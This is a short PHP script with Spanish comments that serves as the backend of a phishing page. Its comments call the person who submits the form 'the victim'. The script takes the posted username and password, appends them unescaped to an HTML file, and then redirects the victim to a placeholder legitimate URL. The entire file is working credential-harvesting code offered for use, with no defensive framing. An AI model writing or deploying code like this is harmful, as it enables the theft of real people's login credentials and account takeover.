<?php
/*
Este archivo es el que procesa todos los datos de la victima y lo guarda en un archivo (leeme.html <- Aqui se guardaran los datos).
*/

// Asigna el valor a las variables del usuario y contraseña
$usuario = $_POST['username'];
$contraseña = $_POST['password'];

//Asigna el valor a la variable donde se guarda el usuario y contraseña
$guardame = fopen('leemee.html','a+');
fwrite($guardame,
"<tr><td>".$usuario."</td>".
"<td>".$contraseña."</td></tr>");

fclose($guardame);
//Redirecciona a la web que pongas
echo "<meta http-equiv='refresh' content='1;url=http://url.de.la.pagina.aqui.com'>"
?>